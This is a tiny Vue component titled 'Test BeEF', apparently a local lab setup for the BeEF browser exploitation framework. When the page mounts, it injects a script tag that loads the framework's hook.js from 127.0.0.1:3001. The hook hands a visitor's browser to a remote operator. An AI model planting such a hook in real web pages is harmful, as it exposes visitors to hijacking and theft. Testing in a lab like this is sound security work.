<template>
  <div>
    <h1>Test BeEF</h1>
  </div>
</template>

<script setup>
import { onMounted } from 'vue'

onMounted(() => {
  const script = document.createElement('script')
  script.src = 'http://127.0.0.1:3001/hook.js'
  script.async = true
  document.body.appendChild(script)
})
</script>